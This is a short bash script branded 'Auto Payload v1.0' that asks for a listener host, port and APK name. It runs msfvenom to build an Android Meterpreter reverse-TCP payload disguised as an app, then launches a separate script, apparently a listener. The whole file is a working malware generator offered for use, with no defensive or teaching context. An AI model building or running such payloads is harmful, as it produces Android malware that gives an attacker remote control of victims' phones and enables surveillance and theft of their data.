#!/bin/bash
clear
echo -e "\e[1;32m  Auto Payload     v1.0"
echo ""
echo -e "\e[1;37m code By Ad A M  \e[0m"
df=$(pwd)
	
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME             : " APK
 	echo -e "\n\e[1;32m  Plz wite  "
	echo ` msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST  LPORT=$LPORT R -o $APK.apk`
	
	echo `xfce4-terminal --title="Ad A M " --color-bg="black" --execute $df/mf.sh &`
